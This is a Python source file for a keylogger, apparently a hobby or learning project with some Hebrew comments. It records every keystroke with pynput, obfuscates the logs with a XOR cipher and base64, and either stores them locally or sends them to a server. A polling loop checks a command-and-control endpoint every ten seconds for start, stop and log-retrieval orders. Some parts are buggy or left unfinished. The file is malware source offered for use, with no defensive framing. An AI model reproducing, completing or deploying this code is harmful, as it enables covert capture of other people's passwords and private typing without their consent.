import base64
from datetime import datetime
import threading
from threading import Thread
from pynput import keyboard
import time
import json
from flask import Flask, request, jsonify
import requests

#
# app = Flask(__name__)
URL = "http://127.0.0.1:5000/receive_logs"

ENCRYPTED_LOG_FILE = "encrypted_logs.json"
ENCRYPTION_KEY = "613".encode('utf-8')


#
# @app.route('/get_logs', methods=['GET'])
# def get_logs():
#     logs_data = JSONFileHandler.read_logs()
#     return jsonify(logs_data), 200
#
#
# @app.route('/start', methods=['GET'])
# def start():
#     Manager().start_logging()
#     return "KeyLogger started listening", 200
#
#
# @app.route('/route', methods=['GET'])
# def route():
#     x = Manager()
#     x.routing_to_server()
#     x.start_logging()
#     return "KeyLogger started listening", 200
#
#
# @app.route('/stop', methods=['GET'])
# def stop():
#     Manager().stop_logging()
#     return "KeyLogger stopped listening", 200
#
#
# @app.route('/time_to_run/<value>', methods=['GET'])
# def time_to_run(value):
#     if int(value) > 0:
#         Manager().run_time(int(value))
#         return f"KeyLogger started listening for {value} minutes", 200
#     else:
#         return "No runtime received.", 200


def send_logs(data):
    response = requests.post(URL, json=data, headers={"Content-Type": "applicetion/json"})
    print(f"Response: {response.status_code}, {response.text}")


class JSONFileHandler:
    @staticmethod
    def read_logs():
        try:
            with open(ENCRYPTED_LOG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {"logs": []}

    @staticmethod
    def write_log(encrypted_content: str):
        logs = JSONFileHandler.read_logs()
        log_entry = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M"),
            "encrypted_content": encrypted_content
        }
        logs["logs"].append(log_entry)
        with open(ENCRYPTED_LOG_FILE, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=4)


class KeyLogger:
    def __init__(self):
        self.routing = 'file'
        self.current_keys = []
        self.lock = threading.Lock()
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.stop_event = False

    def start(self, time_to_run: int = 0):
        self.listener.start()
        print("Starting listening!")
        if time_to_run <= 0:
            while not self.stop_event:
                time.sleep(60)
                self.save_and_clear()
        else:
            for _ in range(time_to_run):
                time.sleep(60)
                self.save_and_clear()
            self.listener.stop()
            return

    def on_press(self, key):
        with self.lock:
            try:
                key_str = self.format_key(key)
                if key_str:
                    self.current_keys.append(key_str)
            except Exception as e:
                print(f"Error handling key: {e}")

    def format_key(self, key):
        """Format special keys and characters."""
        if key == keyboard.Key.space:
            return ' '
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        return f"[{key.name}]"

    def save_and_clear(self):
        keys_copy = []
        with self.lock:
            keys_copy = self.current_keys.copy()
            self.current_keys.clear()
        keys_str = ''.join(keys_copy)
        Manager.encrypt(keys_str, self.routing)

    def stop_listen(self):
        self.listener.stop()
        self.stop_event = True

    # def routing_to_save(self, route):
    #     self.routing = "server"


class EncryptorDecryptor:
    @staticmethod
    def encrypt(data: str) -> str:
        """Encrypt data using XOR cipher and return base64 string."""
        data_bytes = data.encode('utf-8')
        encrypted = bytes([(data_bytes[i] ^ ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)]) for i in range(len(data_bytes))])
        return base64.b64encode(encrypted).decode('utf-8')

    @staticmethod
    def decrypt(encrypted_b64: str) -> str:
        """Decrypt base64 encoded encrypted string."""
        try:
            encrypted_data = base64.b64decode(encrypted_b64)
            decrypted = bytes(
                [(encrypted_data[i] ^ ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)]) for i in range(len(encrypted_data))])
            return decrypted.decode('utf-8')
        except Exception as e:
            print(f"Decryption error: {e}")
            return ""


class Manager:
    def __init__(self):
        self.key_logger = KeyLogger()
        self.threading_start = threading.Thread(target=self.thread_start_logging)
        self.threading_run_time = None

    def start_logging(self):
        if not self.threading_start.is_alive():
            self.threading_start.start()

    def thread_start_logging(self):
        self.key_logger.start()  # returns on a

    def stop_logging(self):
        self.key_logger.stop_listen()

    def run_time(self, timer: int):
        self.threading_run_time = threading.Thread(target=self.thread_run_time, args=(timer,))
        self.threading_run_time.start()

    def thread_run_time(self, timer: int):
        self.key_logger.start(timer)

    def set_routing(self, routing_type: str):
        if routing_type in ['file', 'server']:
            self.key_logger.routing = routing_type
        else:
            pass
        self.key_logger.routing_to_save(routing_type)

    @staticmethod
    def encrypt(data: str, route):
        encrypted_data = EncryptorDecryptor.encrypt(data)
        if route == 'file':
            JSONFileHandler.write_log(encrypted_data)
        else:
            send_logs(encrypted_data)

    @staticmethod
    def decrypt_log_file():
        logs = JSONFileHandler.read_logs()
        for log in logs["logs"]:
            decrypted = EncryptorDecryptor.decrypt(log["encrypted_content"])
            print(f"{log['timestamp']} {decrypted}")


def check_for_commands():
    """בודק כל 10 שניות אם יש הוראות חדשות מהשרת."""
    while True:
        try:
            response = requests.get(f"http://127.0.0.1:5000/get_commands")
            print("+++")
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    handle_command(command)
        except Exception as e:
            print(f"Error checking for commands: {e}")
        time.sleep(10)


def handle_command(command):
    """מטפל בהוראות מהשרת."""
    action = command.get("action")
    if action == "start":
        manager.start_logging()
    elif action == "stop":
        manager.stop_logging()
    elif action == "set_routing":
        routing_type = command.get("routing")
    elif action == "get_logs":
        logs_data = JSONFileHandler.read_logs()
        send_logs(jsonify(logs_data))


if __name__ == '__main__':
    manager = Manager()
    threading.Thread(target=check_for_commands, daemon=True).start()
    while True:
        time.sleep(1)
    # manager.decrypt_log_file()
    # app.run(host='0.0.0.0', port=5000)

    # m = Manager()
    # m.run_time(1)

    # m.stop()
    # Manager.decrypt_log_file()
